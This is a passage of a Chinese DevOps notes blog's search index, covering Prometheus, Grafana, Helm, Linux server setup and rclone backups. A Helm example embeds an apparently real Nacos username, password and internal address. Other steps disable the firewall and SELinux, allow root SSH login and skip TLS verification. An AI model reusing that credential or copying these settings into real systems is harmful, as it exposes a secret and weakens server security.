--homepath \"/usr/share/grafana\" \u003cnew_password\u003e grafana-cli admin reset-admin-password \u003cnew password\u003e ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-ui%E6%95%99%E7%A8%8B/:3:1","series":null,"tags":["blog","grafana","监控","devops"],"title":"grafana-ui教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-ui%E6%95%99%E7%A8%8B/#重置密码"},{"categories":["point"],"content":"lines 代表一些生活, 电影, 想法的文章或句子. ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/lines/:0:0","series":null,"tags":["point","lines"],"title":"lines","uri":"/posts/%E7%AC%94%E8%AE%B0/point/lines/#"},{"categories":["point"],"content":"prometheus 是现在非常流行的指标采集工具, 用于监控. 要点: 开源免费 指标采集方面的事实标准 ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/prometheus/:0:0","series":null,"tags":["point","prometheus"],"title":"prometheus","uri":"/posts/%E7%AC%94%E8%AE%B0/point/prometheus/#"},{"categories":["blog"],"content":"记录 [[笔记/point/prometheus|prometheus]] 的相关使用.","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/","series":null,"tags":["blog","prometheus","devops","监控"],"title":"prometheus教程","uri":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/"},{"categories":["blog"],"content":" 简介记录 prometheus 的相关使用. ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog","prometheus","devops","监控"],"title":"prometheus教程","uri":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 安装和配置","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog","prometheus","devops","监控"],"title":"prometheus教程","uri":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/#安装和配置"},{"categories":["blog"],"content":" 安装参考官网 Installation | Prometheus 下载解压 # 下载 https://prometheus.io/download/ wget https://github.com/prometheus/prometheus/releases/download/v2.45.0/prometheus-2.45.0.linux-amd64.tar.gz tar -xzvf prometheus-2.45.0.linux-amd64.tar.gz Systemd 配置文件 /etc/systemd/system/prometheus.service [Unit] Description=prometheus # 启动区间30s内,尝试启动3次 StartLimitIntervalSec=30 StartLimitBurst=3 [Service] # 环境变量 $MY_ENV1 # Environment=MY_ENV1=value1 # Environment=\"MY_ENV2=value2\" # 环境变量文件,文件内容\"MY_ENV3=value3\" $MY_ENV3 # EnvironmentFile=/path/to/environment/file1 WorkingDirectory=/root/prometheus-2.48.1.linux-amd64 ExecStart=/root/prometheus-2.48.1.linux-amd64/prometheus --config.file=/root/prometheus-2.48.1.linux-amd64/prometheus.yml # 总是间隔30s重启,配合StartLimitIntervalSec实现无限重启 RestartSec=30s Restart=always # 相关资源都发送term后,后发送kill KillMode=mixed # 最大文件打开数不限制 LimitNOFILE=infinity # 子线程数量不限制 TasksMax=infinity [Install] WantedBy=multi-user.target Alias=prometheus.service 启动 systemctl daemon-reload ; systemctl enable prometheus.service --now 验证 curl 127.0.0.1:9090 ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["blog","prometheus","devops","监控"],"title":"prometheus教程","uri":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/#安装"},{"categories":["blog"],"content":" 常用配置 启动配置存储配置文档 Storage | Prometheus # 指定配置文件 --config.file /etc/prometheus/prometheus.yml # 默认存放路径 --storage.tsdb.path data/ # 保存多大默认是0 可以是512MB,2GB,1TB等等 --storage.tsdb.retention.size # 默认15天 --storage.tsdb.retention.time 15d 主配置文件官网完整配置查看 Configuration | Prometheus global: scrape_interval: 15s # 每15s采集一次 evaluation_interval: 15s # 每15s进行一次规则计算,数据汇总 # scrape_timeout: 10s # 默认10s超时 scrape_configs: # 极简 - job_name: \"demo_node\" static_configs: - targets: [\"localhost:9100\"] # 常用配置 - job_name: \"demo_app\" tls_config: insecure_skip_verify: true # 忽略证书 scheme: https # 默认http metrics_path: \"/metrics\" # 默认 static_configs: - targets: [\"192.168.31.100:5001\"] # 服务发现 file_sd_config可以从文本文件去发现 # 下面把注入到eureka的元数据prometheus_path的值,覆盖掉默认的metrics_path,使得prometheus能采集到metrics - job_name: \"eureka_sd\" relabel_configs: - source_labels: [\"__meta_eureka_app_instance_metadata_prometheus_path\"] action: replace target_label: __metrics_path__ regex: (.+) eureka_sd_configs: - server: 'http://172.26.54.108:8761/eureka' ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","prometheus","devops","监控"],"title":"prometheus教程","uri":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/#常用配置"},{"categories":["blog"],"content":" 常用配置 启动配置存储配置文档 Storage | Prometheus # 指定配置文件 --config.file /etc/prometheus/prometheus.yml # 默认存放路径 --storage.tsdb.path data/ # 保存多大默认是0 可以是512MB,2GB,1TB等等 --storage.tsdb.retention.size # 默认15天 --storage.tsdb.retention.time 15d 主配置文件官网完整配置查看 Configuration | Prometheus global: scrape_interval: 15s # 每15s采集一次 evaluation_interval: 15s # 每15s进行一次规则计算,数据汇总 # scrape_timeout: 10s # 默认10s超时 scrape_configs: # 极简 - job_name: \"demo_node\" static_configs: - targets: [\"localhost:9100\"] # 常用配置 - job_name: \"demo_app\" tls_config: insecure_skip_verify: true # 忽略证书 scheme: https # 默认http metrics_path: \"/metrics\" # 默认 static_configs: - targets: [\"192.168.31.100:5001\"] # 服务发现 file_sd_config可以从文本文件去发现 # 下面把注入到eureka的元数据prometheus_path的值,覆盖掉默认的metrics_path,使得prometheus能采集到metrics - job_name: \"eureka_sd\" relabel_configs: - source_labels: [\"__meta_eureka_app_instance_metadata_prometheus_path\"] action: replace target_label: __metrics_path__ regex: (.+) eureka_sd_configs: - server: 'http://172.26.54.108:8761/eureka' ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","prometheus","devops","监控"],"title":"prometheus教程","uri":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/#启动配置"},{"categories":["blog"],"content":" 常用配置 启动配置存储配置文档 Storage | Prometheus # 指定配置文件 --config.file /etc/prometheus/prometheus.yml # 默认存放路径 --storage.tsdb.path data/ # 保存多大默认是0 可以是512MB,2GB,1TB等等 --storage.tsdb.retention.size # 默认15天 --storage.tsdb.retention.time 15d 主配置文件官网完整配置查看 Configuration | Prometheus global: scrape_interval: 15s # 每15s采集一次 evaluation_interval: 15s # 每15s进行一次规则计算,数据汇总 # scrape_timeout: 10s # 默认10s超时 scrape_configs: # 极简 - job_name: \"demo_node\" static_configs: - targets: [\"localhost:9100\"] # 常用配置 - job_name: \"demo_app\" tls_config: insecure_skip_verify: true # 忽略证书 scheme: https # 默认http metrics_path: \"/metrics\" # 默认 static_configs: - targets: [\"192.168.31.100:5001\"] # 服务发现 file_sd_config可以从文本文件去发现 # 下面把注入到eureka的元数据prometheus_path的值,覆盖掉默认的metrics_path,使得prometheus能采集到metrics - job_name: \"eureka_sd\" relabel_configs: - source_labels: [\"__meta_eureka_app_instance_metadata_prometheus_path\"] action: replace target_label: __metrics_path__ regex: (.+) eureka_sd_configs: - server: 'http://172.26.54.108:8761/eureka' ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","prometheus","devops","监控"],"title":"prometheus教程","uri":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/#主配置文件"},{"categories":["blog"],"content":" 高可用采集 存储: prometheus 的后端存储使用 mimir, 实际存放在 minio 里. 通过集群的方式保证两者高可用. k8s 采集: 使用 shards-and-replicas.md 多实例分片拓展. 动态服务发现: 使用现有方案过滤, 例如 consul_sd_config, 通过 label 进行花费, 使多个节点均匀分配指标采集. 也可以使用 file_sd_config 自己编写一个动态服务发现 手动管理: 通常来说 prometheus 的性能不弱, 部署一个起码能服务 1000 个以上的微服务, 即使手动部署, 也不会是一件太困难的事情. ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","prometheus","devops","监控"],"title":"prometheus教程","uri":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/#高可用采集"},{"categories":["blog"],"content":" 指标与查询","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/:3:0","series":null,"tags":["blog","prometheus","devops","监控"],"title":"prometheus教程","uri":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/#指标与查询"},{"categories":["blog"],"content":" 查询类型 vector 一个时刻的结果 instant query matrix 一段时间的结果 range query ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/:3:1","series":null,"tags":["blog","prometheus","devops","监控"],"title":"prometheus教程","uri":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/#查询类型"},{"categories":["blog"],"content":" 数据类型 gauge 当前值 counter 计数器 时间选择器只能用在这 histogram 直方图 summary 摘要 ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/:3:2","series":null,"tags":["blog","prometheus","devops","监控"],"title":"prometheus教程","uri":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/#数据类型"},{"categories":["blog"],"content":" 常用函数 rate 配合时间，生成条状图 sum by(code) (rate(prometheus_http_requests_total[1m])) 仅添加指定标签 sum without(code) (rate(prometheus_http_requests_total[1m])) 去除标签 topk(5,xxx) xxx 的前 5 bottomk(5,xxx) xxx 的后 5 sum (rate(prometheus_http_requests_total[1m] offset 1h ) ) -sum (rate(prometheus_http_requests_total[1m])) 环比增加与减少 absent(qweoj)===1 表示指标 qweoj 不存在 histogram_quantile(0.99,sum (rate(prometheus_http_requests_total[1m]))) 分位置 rate(node_cpu_seconds_total{mode=\"idle\"}[10m])*100 cpu 空闲率 ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/:3:3","series":null,"tags":["blog","prometheus","devops","监控"],"title":"prometheus教程","uri":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/#常用函数"},{"categories":["blog"],"content":" 查询示例 Pod 内存使用率取每个容器的最大内存值 / requests 内存 * 100 (max(container_memory_working_set_bytes{namespace=\"default\"}) by (pod) / sum(kube_pod_container_resource_requests_memory_bytes{namespace=\"default\"}) by (pod)) * 100 ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/:3:4","series":null,"tags":["blog","prometheus","devops","监控"],"title":"prometheus教程","uri":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/#查询示例"},{"categories":["blog"],"content":" 查询示例 Pod 内存使用率取每个容器的最大内存值 / requests 内存 * 100 (max(container_memory_working_set_bytes{namespace=\"default\"}) by (pod) / sum(kube_pod_container_resource_requests_memory_bytes{namespace=\"default\"}) by (pod)) * 100 ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/:3:4","series":null,"tags":["blog","prometheus","devops","监控"],"title":"prometheus教程","uri":"/posts/%E7%AC%94%E8%AE%B0/prometheus%E6%95%99%E7%A8%8B/#pod-内存使用率"},{"categories":["point"],"content":"supervisor 是一个守护进程. 要点: python 开发 使用人数多, 经过了长时间验证 ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/supervisor/:0:0","series":null,"tags":["point","supervisor"],"title":"supervisor","uri":"/posts/%E7%AC%94%E8%AE%B0/point/supervisor/#"},{"categories":["point"],"content":"树莓派 是一种基于 arm 的微型电脑. 要点: 价格相对便宜 社区生态庞大 GPIO 引脚 ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/%E6%A0%91%E8%8E%93%E6%B4%BE/:0:0","series":null,"tags":["point","树莓派"],"title":"树莓派","uri":"/posts/%E7%AC%94%E8%AE%B0/point/%E6%A0%91%E8%8E%93%E6%B4%BE/#"},{"categories":["point"],"content":" 可玩性 树莓派 sd卡 充电线 hdmi数据线 读卡器 散热相关 红外遥控器 红外接收---接收管？发射器？ 面包板和线材 小按钮 小屏幕 摄像头 电阻 rfid或者nfc lcd1602串行 扬声器 led灯管 旋转按钮 切换按钮 显示器 读卡器模块 ","date":"2023-07-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/%E6%A0%91%E8%8E%93%E6%B4%BE/:1:0","series":null,"tags":["point","树莓派"],"title":"树莓派","uri":"/posts/%E7%AC%94%E8%AE%B0/point/%E6%A0%91%E8%8E%93%E6%B4%BE/#可玩性"},{"categories":["point"],"content":"csharp 是一门静态编程语言. 要点: 性能好 微软大厂支持 ","date":"2023-07-08","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/csharp/:0:0","series":null,"tags":["point","csharp"],"title":"csharp","uri":"/posts/%E7%AC%94%E8%AE%B0/point/csharp/#"},{"categories":["point"],"content":"helm 是 k8s 用来将应用所需资源打包为一个整体的工具。可类比为 yum/centos ,apt/ubuntu. ","date":"2023-07-08","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/helm/:0:0","series":null,"tags":["point","helm"],"title":"helm","uri":"/posts/%E7%AC%94%E8%AE%B0/point/helm/#"},{"categories":["point"],"content":" 优势 整体部署: 例如后台 api 服务需要 deployment 对 pod 进行管理、同时需要 service 对外提供服务 统一管理: 整个应用的所有关联资源统一升级/回滚 版本化: 一些中间件的部署可以通过版本化来进行迭代 维护成本: 通过少数几个通用的 helm 模板来打包。不需要开发者对每个代码仓库进行改动 ","date":"2023-07-08","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/helm/:0:1","series":null,"tags":["point","helm"],"title":"helm","uri":"/posts/%E7%AC%94%E8%AE%B0/point/helm/#优势"},{"categories":["point"],"content":" 基础概念 repo 是一个仓库，有一些别人写好的。你自己的代码打包以后也可以上传到私有仓库 charts 是一个应用所需资源的概括 release 是一个 charts 发布到 k8s 后的实例 ","date":"2023-07-08","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/helm/:0:2","series":null,"tags":["point","helm"],"title":"helm","uri":"/posts/%E7%AC%94%E8%AE%B0/point/helm/#基础概念"},{"categories":["point"],"content":" 安装 Releases · helm/helm tar xf xxx.tar.gz mv helm /usr/local/sbin/helm ","date":"2023-07-08","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/helm/:0:3","series":null,"tags":["point","helm"],"title":"helm","uri":"/posts/%E7%AC%94%E8%AE%B0/point/helm/#安装"},{"categories":["point"],"content":" 基础操作 说明 操作 添加 repo 仓库 helm repo add bitnami https://charts.bitnami.com/bitnami 更新仓库 helm repo update 搜索 charts 包 helm search repo redis 拉取 charts 包到当前目录 helm pull apisix/apisix 安装 charts 包 helm install name bitnami/mysql 查看当前部署 helm ls 查看应用详情 helm status name 卸载指定的 release helm uninstall name install 命令可以通过 - --set image.tag=latest 或 --values my-values.yaml 修改默认值 编写 helm 脚本: 说明 操作 创建一个 helm 模板 helm create name 打包一个 helm 模板 helm package name ","date":"2023-07-08","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/helm/:0:4","series":null,"tags":["point","helm"],"title":"helm","uri":"/posts/%E7%AC%94%E8%AE%B0/point/helm/#基础操作"},{"categories":["point"],"content":" 文件语法使用内容 if如果 ne不等于 默认字符串value转int {{- if .Values.service.enabled }} apiVersion: v1 kind: Service metadata: name: backend-service-helm-service labels: name: backend-service-helm-service spec: type: {{ .Values.service.type }} ports: - port: {{ .Values.port }} targetPort: {{ .Values.port }} protocol: TCP name: backend-service-helm-service-pod-{{ .Values.port }} {{- if ne (int .Values.grpc_port) 0 }} - port: {{ .Values.grpc_port }} targetPort: {{ .Values.grpc_port }} protocol: TCP name: backend-service-helm-service-pod-{{ .Values.grpc_port }} {{- end }} selector: name: backend-service-helm-pod {{- end }} 写入格式化内容 (json 示例) apiVersion: v1 data: config.yaml: | {{- if eq .Values.deploy_env \"dev\" }} version: dev nacos: addr: 100.66.6.37 dataId: backend-service-helm.yaml username: shini-dev password: pKb2NHSnRiR namespaceId: e2b13a92-d47b-4f9f-9d70-6eaa4beea75b {{- end }} ","date":"2023-07-08","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/helm/:1:0","series":null,"tags":["point","helm"],"title":"helm","uri":"/posts/%E7%AC%94%E8%AE%B0/point/helm/#文件语法"},{"categories":["point"],"content":"k8s 是非常流行的容器编排工具. 要点: 免费 社区,生态强大 事实标准 ","date":"2023-07-08","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/k8s/:0:0","series":null,"tags":["point","k8s"],"title":"k8s","uri":"/posts/%E7%AC%94%E8%AE%B0/point/k8s/#"},{"categories":["blog"],"content":" 简介经常会购买/重装 linux 服务器, 制作过很多次的镜像. 这里记录一下的初始化配置, 以后搞成一个 shell 脚本来用. ","date":"2023-07-08","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/:1:0","series":null,"tags":["blog","linux"],"title":"linux的初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/#简介"},{"categories":["blog"],"content":" 待添加#todo/笔记 Alias Truncate 定时清空日志 Limit 配置 ","date":"2023-07-08","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/:2:0","series":null,"tags":["blog","linux"],"title":"linux的初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/#待添加"},{"categories":["blog"],"content":" server 初始化","date":"2023-07-08","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/:3:0","series":null,"tags":["blog","linux"],"title":"linux的初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/#server-初始化"},{"categories":["blog"],"content":" 登录 允许 root 远程登录 允许 root 远程登录后，开始用 tabby 连接操作 禁用密码登录/密钥登录 ","date":"2023-07-08","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/:3:1","series":null,"tags":["blog","linux"],"title":"linux的初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/#登录"},{"categories":["blog"],"content":" 执行 shell开始运行 #!/bin/bash ufw disable apt install selinux-utils policycoreutils ntp ntpdate htop nethogs nload tree lrzsz iotop iptraf-ng zip unzip ca-certificates curl gnupg libpcre3 libpcre3-dev openssl libssl-dev build-essential rsync sshpass -y install -m 0755 -d /etc/apt/keyrings curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpg sudo chmod a+r /etc/apt/keyrings/docker.gpg echo \\ \"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu \\ \"$(. /etc/os-release \u0026\u0026 echo \"$VERSION_CODENAME\")\" stable\" | \\ tee /etc/apt/sources.list.d/docker.list \u003e /dev/null apt update -y apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin ntpdate ntp.aliyun.com hwclock -w timedatectl set-timezone Asia/Shanghai apt update -y apt upgrade -y ","date":"2023-07-08","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/:3:2","series":null,"tags":["blog","linux"],"title":"linux的初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/#执行-shell"},{"categories":["blog"],"content":" 手动配置关闭 selinux vim /etc/selinux/config SELINUX=disabled 时间配置 ntp - 原始/容器 docker 配置 docker公共镜像源 vim /etc/docker/daemon.json # 放入公共镜像源 systemctl daemon-reload systemctl restart docker 配置 nginx nginx编译和升级 , nginx配置 配置 ACME 配置 alist 配置 自建bitwarden 部署 testserver, pusher ","date":"2023-07-08","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/:3:3","series":null,"tags":["blog","linux"],"title":"linux的初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/#手动配置"},{"categories":["blog"],"content":" Home-server 初始化 DDNS-go rclone filebrowser alias rc-check='rclone check aliyunpan:/ /data/backup/alist-backup --exclude \"video/**\" --exclude \"iso/**\" -P' alias rc-copy='rclone copy aliyunpan:/ /data/backup/alist-backup --exclude \"video/**\" --exclude \"iso/**\" --header \"Referer:\" -P' export PATH=\"/root/rclone/rclone-v1.62.2-linux-arm64:$PATH\" RCLONE 同步到本地 # 挂载到本地 mount -t ntfs-3g /dev/sda1 /data/backup # 永久挂载 /etc/fstab /dev/sda1 /data/backup ntfs-3g defaults 0 0 # 下载rclone https://rclone.org/docs/ 解压 # 配置rclone ./rclone config # 查看效果config后的效果 ./rclone config show [aliyunpan] - type: webdav - url: https://alist.kentxxq.com/dav/ - vendor: other - user: admin - pass: *** ENCRYPTED *** # 检查异同 --max-depth 1 深度 ./rclone check aliyunpan:/ /data/backup/alist-backup --exclude \"video/**\" --exclude \"iso/**\" # copy到本地 -P可以查看进度，适合ui使用 ./rclone copy aliyunpan:/ /data/backup/alist-backup --exclude \"video/**\" --exclude \"iso/**\" --header \"Referer:\" # 每晚1点定时 0 1 * * * root /root/rclone/rclone-v1.62.2-linux-arm64/rclone copy aliyunpan:/ /data/backup/alist-backup --exclude \"video/**\" --exclude \"iso/**\" --header \"Referer:\" ","date":"2023-07-08","objectID":"/posts/%E7%AC%94%E8%AE%B0/linux%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/:4:0","series":null,"tags":["blog","linux"],"title":"linux的初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/linux%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96/#home-server-初始化"},{"categories":["blog"],"content":"记录和收集工具, 做到笔记里感觉比书签要好用.","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"},{"categories":["blog"],"content":" 简介记录和收集工具, 做到笔记里感觉比书签要好用. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:1:0","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#简介"},{"categories":["blog"],"content":" AI pc客户端+自部署web端 Poe 提供各个公司的多种 AI 模型 ChatGPT 有免费/付费服务 OpenAI的Models文档 ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:2:0","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#ai"},{"categories":["blog"],"content":" 编码","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:0","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#编码"},{"categories":["blog"],"content":" 运维 监控 监控网站 blackbox-exporter操作手册 OneUptime 监控站点 ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:1","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#运维"},{"categories":["blog"],"content":" 运维 监控 监控网站 blackbox-exporter操作手册 OneUptime 监控站点 ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:1","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#监控"},{"categories":["blog"],"content":" Nodejs 中后台 vue-vben-admin-中后台UI 验证码 DOOM Captcha 是一个简单的老游戏, 用来做验证码 UI/图表 库 对比不同, 类似于 git-diff GitHub - MrWangJustToDo/git-diff-view: A Diff View component for React / Vue, just like Github 腾讯的 UI 库，有 vue 的移动端 + 桌面端版本 TDesign 图表可视化解决方案 - 字节跳动 VisActor 拖拽流程图 GitHub - bpmn-io/bpmn-js: A BPMN 2.0 rendering toolkit and web modeler. 三维可视化项目落地 GitHub - hawk86104/icegl-three-vue-tres: 🎉🎉🎊 一款让你的三维可视化项目快速落地の开源框架 🎊🎉🎉 永久开源，免费商用 【 three vue ts js 】 ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:2","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#nodejs"},{"categories":["blog"],"content":" Nodejs 中后台 vue-vben-admin-中后台UI 验证码 DOOM Captcha 是一个简单的老游戏, 用来做验证码 UI/图表 库 对比不同, 类似于 git-diff GitHub - MrWangJustToDo/git-diff-view: A Diff View component for React / Vue, just like Github 腾讯的 UI 库，有 vue 的移动端 + 桌面端版本 TDesign 图表可视化解决方案 - 字节跳动 VisActor 拖拽流程图 GitHub - bpmn-io/bpmn-js: A BPMN 2.0 rendering toolkit and web modeler. 三维可视化项目落地 GitHub - hawk86104/icegl-three-vue-tres: 🎉🎉🎊 一款让你的三维可视化项目快速落地の开源框架 🎊🎉🎉 永久开源，免费商用 【 three vue ts js 】 ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:2","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#中后台"},{"categories":["blog"],"content":" Nodejs 中后台 vue-vben-admin-中后台UI 验证码 DOOM Captcha 是一个简单的老游戏, 用来做验证码 UI/图表 库 对比不同, 类似于 git-diff GitHub - MrWangJustToDo/git-diff-view: A Diff View component for React / Vue, just like Github 腾讯的 UI 库，有 vue 的移动端 + 桌面端版本 TDesign 图表可视化解决方案 - 字节跳动 VisActor 拖拽流程图 GitHub - bpmn-io/bpmn-js: A BPMN 2.0 rendering toolkit and web modeler. 三维可视化项目落地 GitHub - hawk86104/icegl-three-vue-tres: 🎉🎉🎊 一款让你的三维可视化项目快速落地の开源框架 🎊🎉🎉 永久开源，免费商用 【 three vue ts js 】 ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:2","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#验证码"},{"categories":["blog"],"content":" Nodejs 中后台 vue-vben-admin-中后台UI 验证码 DOOM Captcha 是一个简单的老游戏, 用来做验证码 UI/图表 库 对比不同, 类似于 git-diff GitHub - MrWangJustToDo/git-diff-view: A Diff View component for React / Vue, just like Github 腾讯的 UI 库，有 vue 的移动端 + 桌面端版本 TDesign 图表可视化解决方案 - 字节跳动 VisActor 拖拽流程图 GitHub - bpmn-io/bpmn-js: A BPMN 2.0 rendering toolkit and web modeler. 三维可视化项目落地 GitHub - hawk86104/icegl-three-vue-tres: 🎉🎉🎊 一款让你的三维可视化项目快速落地の开源框架 🎊🎉🎉 永久开源，免费商用 【 three vue ts js 】 ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:2","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#ui图表-库"},{"categories":["blog"],"content":" Python 打包 Astral · GitHub uv 会取代 rye. 但是现阶段 rye 更好用 这个机构下面还有 ruff PDM 